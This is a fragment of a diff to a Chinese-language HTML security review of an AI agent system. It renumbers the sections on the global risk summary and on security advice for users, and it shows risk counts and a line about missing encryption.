   ❌ 加密缺失——全链路明文（Session/Memory/Config）</code></pre>
-<h3 id="全局风险总表">7.2 全局风险总表</h3>
+<h3 id="全局风险总表">8.2 全局风险总表</h3>
 <p>以下是对前四章（Gateway、Agent
 Engine、Memory、Security）全部安全风险的汇总，按严重程度排序：</p>
 <table>
@@ -2316,8 +2522,9 @@ Engine、Memory、Security）全部安全风险的汇总，按严重程度排序
   🟠 高:   6 个 — 其中 3 个未被 Security 模块覆盖
   🟡 中:   8 个 — 其中 4 个未被 Security 模块覆盖
   ✅ 完全解决: 仅 2 个 (11%)</code></pre>
-<h3 id="给使用者的安全建议">7.3 给使用者的安全建议</h3>
-<h4 id="个人部署用户性价比最高的方案">个人部署用户（性价比最高的方案）</h4>
+<h3 id="给使用者的安全建议">8.3 给使用者的安全建议</h3>
+<h4
+id="个人部署用户性价比最高的方案">个人部署用户（性价比最高的方案）</h4>
 <pre><code>最佳实践清单:
 
   1. 网络层
